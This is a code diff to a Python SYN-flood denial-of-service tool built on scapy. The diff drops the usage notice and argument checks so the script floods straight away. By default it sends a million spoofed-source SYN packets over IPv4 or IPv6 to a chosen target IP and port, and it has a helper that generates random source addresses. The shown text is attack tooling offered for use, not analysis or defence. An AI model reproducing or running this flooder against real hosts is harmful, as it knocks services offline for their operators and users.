@@ -14,16 +14,6 @@ from argparse import ArgumentParser
 import scapy.all
 
 
-NOTICE = f"""usage: {sys.argv[0]} [-h] [--target TARGET] [--port PORT] [--count COUNT] [--version]
-    optional arguments:
-        -h, --help show this help message and exit
-        --target TARGET, -t TARGET target IP address
-        --port PORT, -p PORT target port number
-        --count COUNT, -c COUNT number of packets
-        --version, -v show programs version number and exit
-"""
-
-
 def random_ip():
     """ generate a random IP number """
     ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
@@ -99,32 +89,15 @@ def main():
     parser.add_argument("--target", "-t", help="target IP address", default="server")
     parser.add_argument("--port", "-p", help="target port number", default="8080")
     parser.add_argument("--count", "-c", help="number of packets", default="1000000")
-    parser.add_argument("--format", "-f", help="format of target(Can ignore, default use ipv4)")
+    parser.add_argument("--format", "-f", help="format of target (4/6 4 is default)", default="4")
     parser.add_argument("--version", "-v", action="version", version="Python SynFlood Tool v2.0.1")
     parser.epilog = f"Usage: {sys.argv[0]} -t 10.20.30.40 -p 8080 -c 1 -f 6"
 
     args = parser.parse_args()
 
-    if args.target is not None:
-        if args.port is not None:
-            if args.count is None:
-                print("[!]You did not use --counter/-c parameter, so 1 packet will be sent..")
-                syn_flood(args.target, args.port, 1)
-
-            else:
-                print(f"args.format = {args.format}")
-                if args.format == "6":
-                    syn_flood_v6(args.target, args.port, int(args.count))
-                else:
-                    syn_flood(args.target, args.port, int(args.count))
-
-        else:
-            print("[-]Please, use --port/-p to give targets port!")
-            print("[!]Example: -p 445")
-            print("[?] -h for help")
-            sys.exit(1)
+    if args.format == "6":
+        syn_flood_v6(args.target, args.port, int(args.count))
     else:
-        print(NOTICE)
-        sys.exit(1)
+        syn_flood(args.target, args.port, int(args.count))
 
 main()
